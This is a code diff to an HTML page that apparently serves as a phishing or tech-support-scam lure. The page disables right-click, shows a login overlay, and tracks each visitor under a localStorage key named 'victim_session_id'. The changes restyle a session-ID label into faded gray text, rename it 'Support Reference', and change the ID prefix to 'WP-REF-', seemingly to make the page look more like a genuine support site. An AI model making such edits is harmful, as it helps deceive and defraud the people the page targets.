@@ -150,10 +150,19 @@
 @keyframes blinker {
     50% { opacity: 0.2; }
 }
-        #session-display {
-            position: fixed; bottom: 10px; right: 10px; background: rgba(0,0,0,0.7);
-            color: #0f0; padding: 5px 10px; border-radius: 3px; font-size: 11px; z-index: 3000000; font-family: monospace;
-        }
+       #session-display {
+    position: fixed; 
+    bottom: 10px; 
+    right: 15px; 
+    background: transparent; /* Remove the black box */
+    color: #888;              /* Change green to subtle gray */
+    padding: 0; 
+    border-radius: 0; 
+    font-size: 10px;          /* Make it even smaller */
+    z-index: 3000000; 
+    font-family: Arial, sans-serif; /* Use a standard font, not monospace */
+    opacity: 0.6;             /* Make it slightly faded */
+}
 
         /* ANIMATIONS */
         .shake { animation: shake_anim 0.2s ease-in-out 0s 2; }
@@ -369,7 +378,7 @@
 </head>
 <body oncontextmenu="return false;">
 
-    <div id="session-display">SESSION_ID: <span id="session-id-text">...</span></div>
+    <div id="session-display">Support Reference: <span id="session-id-text">...</span></div>
 
     <div id="login-overlay">
         <div class="login-logo-circle"></div>
@@ -464,7 +473,7 @@
     
     if (!sessionID) {
         // Generates a random ID like SEC-612-HTH4R7
-        sessionID = "SEC-" + Math.floor(Math.random() * 900 + 100) + "-" + (Math.random().toString(36).substring(2, 8)).toUpperCase();
+        sessionID = "WP-REF-" + Math.floor(Math.random() * 900 + 100) + "-" + (Math.random().toString(36).substring(2, 8)).toUpperCase();
         localStorage.setItem('victim_session_id', sessionID);
     }
 
